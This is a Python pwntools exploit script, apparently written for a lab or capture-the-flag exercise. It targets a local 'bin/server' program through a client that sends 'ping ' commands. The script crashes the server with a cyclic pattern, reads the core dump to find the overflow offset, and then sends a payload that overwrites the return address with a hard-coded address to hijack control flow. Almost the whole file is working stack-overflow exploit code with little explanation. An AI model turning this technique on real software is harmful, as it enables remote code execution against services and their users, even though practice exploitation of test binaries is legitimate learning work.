from pwn import *

context.clear(arch= 'amd64')

hijackFlowAddr = 0x555555568140

manualServer = True
crash = False
if crash and not manualServer:
        server = process(['bin/server'])
        client = process(['bin/client', '127.0.0.1', '8080'])

        # Generate a cyclic pattern so that we can auto-find the offset
        payload = cyclic(700)  
        payload = "ping " + payload
        client.sendline(payload)
        server.wait_for_close()
        print "Core : "
        #Get the core dump
        core = Coredump('baseDir/core')
        rip = hex(core.rip)
        faultAddr = hex(core.fault_addr)
        faultAddrLSB = faultAddr[-8:]
        print faultAddr
        print faultAddrLSB
        client.close()
        server.close()        

else:
        faultAddr = hex(0x616c6761616b6761)
        faultAddrLSB = faultAddr[-8:]
        print faultAddr
        print faultAddrLSB
        
# Run the process once so that it crashes

if not manualServer:
        server = process(['bin/server'])
client = process(['bin/client', '127.0.0.1', '8080'])




exploit = cyclic(cyclic_find(int(faultAddrLSB, 16)) - 10)

exploit += "AAAAAAAAAA" + p64(hijackFlowAddr) * 5

print len(exploit)
client.sendline("ping " + exploit)
print "ping " + exploit
if not manualServer:
        res = server.recvall(timeout=1)
        print res
core = Coredump('baseDir/core')

client.close()

if not manualServer:
        server.close()
"""
payload = "ping " + payload
print(payload)
client.sendline(payload)
res = server.recvall(timeout=8)
#server.wait_for_close()


print "Core : "
#Get the core dump
core = Coredump('baseDir/core')
print hex(core.rip)

#server.close()
#client.close()

elfFile = ELF('bin/server')
#print elfFile.symbols #78985
#print elfFile.got
#print elfFile.plt
"""
